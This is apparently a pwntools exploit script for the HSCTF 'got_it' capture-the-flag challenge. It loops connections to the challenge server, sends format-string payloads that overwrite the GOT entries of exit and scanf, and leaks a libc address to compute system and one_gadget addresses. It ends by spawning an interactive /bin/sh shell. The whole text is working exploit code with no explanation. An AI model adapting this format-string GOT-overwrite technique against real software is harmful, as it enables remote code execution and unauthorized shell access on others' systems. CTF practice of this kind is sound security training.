from pwn import *
from time import sleep
for i in range(256):
    #p=process("./got_it")
    p=remote("pwn.hsctf.com",5004)
    leak="%43$p"
    exit_got=0x403fa8
    exit_over=0x4010b0
    scanf_got=0x403fe8
    setvbuf_got=0x403f98
    mprotect_got=0x403fa0
    fgets_got=0x403f88
    libc_print_got_off=0x3eb048
    payload=""
    payload+="%"+str(exit_over)+"x"
    payload+="%13$lln"
    payload+="%43$p"
    payload+="X"*(40-len(payload))
    payload+=p64(exit_got)
    p.sendline(payload)
    sleep(3)
    data=p.recvuntil("XXXXXX")
    p.recvuntil("worked!!")
    leak=int(data[-6-12:-6],16)
    base=leak -0x21b97
    one_gadget=base+0x10a38c
    #one_gadget=base+0x4f322
    setvbuf=base+0x812f0
    system = base + 0x000000000004f440
    to_write = system & 0xffffffff
    libc_got_printf=base+libc_print_got_off
    print "#############################"
    print "libc_start_main :",hex(leak)
    print "base :",hex(base)
    print "setvbuf :",hex(setvbuf)
    print "one_gadget :",hex(one_gadget)
    print "libc_got_printf :",hex(libc_got_printf)
    print "#############################"
    print "to_write :",hex(to_write)
    if len(hex(to_write)[2:]) <=7 and int(hex(to_write)[2:][0],16) <=8:
        print "FOUND"
        print "SLEEP"
        sleep(0x1e)
        print "DONE"
        #pause()
        payload=""
        payload+="%"+"4210820"+"x"
        payload+="%13$n"
        payload+="%43$p"
        payload+="X"*(40-len(payload))
        payload+=p64(0x404010)
        #pause()
        p.sendline(payload)
        sleep(3)
        payload=""
        payload+="%"+str(to_write)+"x"
        payload+="%13$n"
        payload+="%43$p"
        payload+="X"*(40-len(payload))
        payload+=p64(scanf_got)
        pause()
        p.sendline(payload)
        p.sendline("/bin/sh\x00")
        p.interactive()
        break
    p.close()